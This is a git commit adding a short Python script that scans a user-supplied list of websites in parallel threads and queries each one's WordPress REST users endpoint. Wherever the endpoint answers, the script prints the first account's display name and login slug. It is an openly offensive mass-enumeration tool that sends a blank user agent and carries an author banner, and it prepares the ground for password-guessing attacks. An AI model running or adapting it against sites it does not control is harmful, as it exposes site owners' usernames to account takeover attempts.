a675f29541cc8d140ce31ca465d7d2a50c3cb5e2
AKAZH ID <36891477+justakazh@users.noreply.github.com>
2019-12-08 17:09:06 +0700

    Add files via upload

---
+++ user_enumeration.py
@@ -0,0 +1,48 @@
+# WP ENUMERATE
+# PYTHON 3.6.7
+# CODED BY AKAZH ID
+
+import requests
+import json
+import threading
+
+print("""
+
+
+
+
+Coded by : Akazh ID
+Facebook : fb.com/justakazh
+""")
+
+def get(url):
+	try:
+
+		header = {
+		"user-agent":""
+		}
+		target = url+"/wp-json/wp/v2/users"
+		r = requests.get(target, headers=header)
+		res = r.text
+		j1 = json.loads(res)
+		if "slug" in res:
+			name = j1[0]['name']
+			slug = j1[0]['slug']
+			print("[+] Found! ---> ",url," || Name : ",name," || Slug : ",slug)
+		else:
+			print("[-] Unknown! ---> ",url)
+
+	except:
+		pass
+
+
+i = input("List >> ")
+o = open(i, "r").readlines()
+for x  in o:
+	try:
+		y = x.strip()
+		y = y.replace("https", "http")
+		t1 = threading.Thread(target=get, args=(y,))
+		t1.start()
+	except:
+		pass
